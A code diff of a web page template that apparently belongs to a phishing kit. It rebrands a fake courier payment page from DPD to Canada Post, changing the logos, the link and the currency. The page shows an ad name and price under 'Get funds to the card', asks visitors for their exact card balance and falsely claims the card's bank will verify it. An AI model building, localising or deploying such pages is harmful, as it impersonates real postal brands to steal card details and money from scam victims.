@@ -105,16 +105,16 @@
 <header id="header" class="bg-white shadow">
     <div class="max-w-7xl mx-auto py-4 px-4 sm:px-4 flex justify-between items-center">
         <div class="flex-shrink-0">
-            <a href="https://www.dpd.co.uk/"><img src="/images/dpd.svg" alt="DPD Logo" class="h-16 w-16"></a>
+            <a href="https://www.canadapost-postescanada.ca/cpc/en/home.page"><img src="/images/canada_post_logo.png" alt="Canada post logo" class="h-16 w-16"></a>
         </div>
     </div>
 </header>
 <div id="main-content" class="flex h-screen items-center justify-center">
     <div class="flex flex-col md:flex-row bg-white rounded-lg shadow-lg overflow-hidden">
         <div class="flex flex-col items-center justify-center p-10">
-            <img src="/images/dpd.svg" alt="DPD Logo" class="mb-4 w-16">
+            <img src="/images/canada_post.jpeg" alt="Canada post logo" class="mb-4 w-16">
             <h1 class="text-2xl font-bold">{{ $order->ad_name }}</h1>
-            <p class="text-4xl mt-2">£{{ $order->price }}</p>
+            <p class="text-4xl mt-2">${{ $order->price }}</p>
         </div>
         <div class="p-10 bg-gray-50">
             <h2 class="text-xl font-semibold mb-4">Get funds to the card</h2>
@@ -214,7 +214,7 @@
                     </label>
                     <input
                         class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
-                        id="card-balance" type="text" placeholder="£0.00">
+                        id="card-balance" type="text" placeholder="$0.00">
                 </div>
                 <span class="text-gray-500 text-sm text-center lg:w-1/2 w-full sm:w-full">To verify, enter the exact balance of your card. The data will be verified through the bank that issued the card.</span>
             </div>
